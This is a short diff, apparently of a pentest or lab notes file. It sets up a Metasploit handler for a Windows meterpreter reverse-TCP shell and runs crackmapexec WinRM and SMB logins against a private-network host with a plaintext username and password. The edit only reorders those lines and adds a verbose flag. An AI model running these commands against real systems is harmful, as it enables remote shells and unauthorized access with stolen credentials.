@@ -29,11 +29,11 @@ use exploit/multi/handler
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST 192.168.1.137
 set LPORT 4444
-
-crackmapexec winrm 192.168.1.84 -u rsilva -p asd123$$$
-crackmapexec smb 192.168.1.84 -u rsilva -p asd123$$$
-
 run
+
+crackmapexec winrm 192.168.1.84 -u rsilva -p asd123$$$ --verbose
+crackmapexec smb 192.168.1.84 -u rsilva -p asd123$$$ --verbose
+
 
 
 
